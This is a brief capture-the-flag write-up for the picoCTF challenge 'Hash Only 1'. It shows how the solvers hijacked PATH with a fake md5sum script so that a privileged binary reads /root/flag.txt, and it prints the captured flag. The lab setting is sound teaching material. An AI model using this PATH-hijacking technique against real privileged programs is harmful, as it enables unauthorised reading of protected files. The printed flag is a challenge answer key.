# Hash Only 1

## Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
Additional details will be available after launching your challenge instance.


## Answer

We immediatly tried running strings on the binary:
```
/bin/bash -c'md5sum /root/flag.txt'
```

* our first thought was that it's some sort of command injection.

One of our other officers actually did something pretty creative:

"when you run strings on it does call md5sum so you have to change the path"

```
echo '#!/bin/bash' > md5sum
echo 'cat /root/flag.txt' >> md5sum
chmod +x md5sum  # Make it executable
export PATH=.:$PATH
```
```
exploited string: picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_fc434b2b}
```
